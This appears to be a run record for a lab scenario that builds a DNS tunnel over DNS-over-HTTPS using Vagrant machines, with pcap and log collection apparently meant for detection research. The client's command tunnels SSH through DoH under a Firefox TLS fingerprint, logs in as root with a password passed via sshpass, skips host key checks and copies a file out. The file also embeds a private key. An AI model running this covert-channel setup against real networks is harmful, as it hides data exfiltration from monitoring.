execution_time: 2022-05-07 17:33:44.565289

variables: {"privkey": "d7ded13f8df25456cd365c7022c538a1341d74d918dc6f7aea64ce855e564345", "pubkey": "b6fcced3162ecc334fcb49a3dc6b094c542fa071d24bf6cab890820f893a5b56", "utls": "Firefox_56"}

scenario: {"name": "DNS Tunnel over DoH Scenario", "description": "\"This Scenario runs DNS Tunnels over DoH\"\n", "provisioner": "vagrant", "use_default_templates": true, "components": [{"name": "dnsoverhttps", "ipv4_address": "192.168.0.10", "description": "Installation of DNS-over-HTTPS server.", "image": "ubuntu/focal64", "setup": {"type": "script", "val": "dns-over-https.bash"}, "run": {"type": "shell", "val": "sudo systemctl stop systemd-resolved; sudo systemctl restart doh-server.service; sudo systemctl restart nginx.service; "}, "artifacts_to_collect": [{"type": "pcap", "val": ["tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53 or port 443 or port 8053"]}, {"type": "files", "val": ["/var/log/nginx/dns.access.log", "/var/log/doh-server.log", "/tmp/filebeat.json*", "/tmp/dns.pcap"]}, {"type": "filebeat", "val": ["/var/log/nginx/dns.access.log", "/var/log/doh-server.log"]}]}, {"name": "dnstt_server", "ipv4_address": "192.168.0.20", "description": "This sets up the DNSTT server.", "image": "ubuntu/focal64", "setup": {"type": "script", "val": "dnstt_server_setup.bash"}, "run": {"type": "shell", "val": "nohup asciinema rec /tmp/dnstt_server.cast -c \\'set -x; /home/vagrant/dnstt/dnstt-server/dnstt-server -udp :53 -privkey d7ded13f8df25456cd365c7022c538a1341d74d918dc6f7aea64ce855e564345 example.attack 127.0.0.1:22 & sleep 1\\'"}, "artifacts_to_collect": [{"type": "files", "val": ["/tmp/*.cast"]}]}, {"name": "dnstt_client", "ipv4_address": "192.168.0.30", "description": "This sets up the DNSTT client.", "image": "ubuntu/focal64", "setup": {"type": "script", "val": "dnstt_client_setup.bash"}, "run": {"type": "shell", "val": "set -x; /home/vagrant/dnstt/dnstt-client/dnstt-client -doh https://192.168.0.10/dns-query -utls Firefox_56 -pubkey b6fcced3162ecc334fcb49a3dc6b094c542fa071d24bf6cab890820f893a5b56 example.attack 127.0.0.1:7000 & sleep 1; rsync -P --rsh=\"sshpass -p root ssh -l root -oStrictHostKeyChecking=no -p 7000\" 127.0.0.1:/root/test-file /tmp/;"}, "artifacts_to_collect": [{"type": "files", "val": ["/tmp/*.cast"]}, {"type": "cli_recording", "val": ["/tmp/dnstt_client_Firefox_56.cast"]}], "depends_on": ["dns_attack_server", "dns_server"]}]}

